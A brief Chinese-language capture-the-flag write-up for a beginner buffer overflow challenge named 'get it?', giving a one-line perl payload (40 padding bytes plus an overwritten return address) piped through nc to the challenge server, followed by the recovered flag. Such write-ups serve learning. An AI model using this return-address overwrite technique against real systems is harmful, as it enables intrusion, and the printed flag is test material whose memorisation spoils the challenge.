# get it?

最水的那種新手buffer overflow題

payload:

`(perl -e 'print "a"x40, "\xb6\x05\x40\x00\x00\x00\x00\x00"';cat) | nc pwn.chal.csaw.io 9001`

flat:

`flag{y0u_deF_get_itls}`
